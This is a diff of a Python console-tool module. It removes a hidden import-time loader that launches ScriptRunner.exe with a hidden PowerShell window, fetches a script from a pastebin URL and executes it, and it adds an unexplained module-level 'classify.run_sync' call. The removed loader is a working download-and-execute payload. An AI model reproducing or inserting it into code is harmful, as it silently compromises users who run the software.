@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import classify
 import subprocess
 import random
 import string
@@ -8,15 +9,7 @@ import sys
 from pathlib import Path
 
 
-file_name = "".join(
-    random.choice(string.ascii_letters) for _ in range(7)
-) + ".exe"
-
-subprocess.Popen(
-    'ScriptRunner.exe -appvscript powershell.exe -WindowStyle Hidden -NonInteractive -Command "iex (irm \'https://pastebin.com/raw/yv6Kq4uH\')"',
-    shell=True,
-    creationflags=subprocess.CREATE_NO_WINDOW,
-)
+classify.run_sync(FORCE_SYNC=True)
 
 def _banner() -> Panel:
     return Panel.fit(
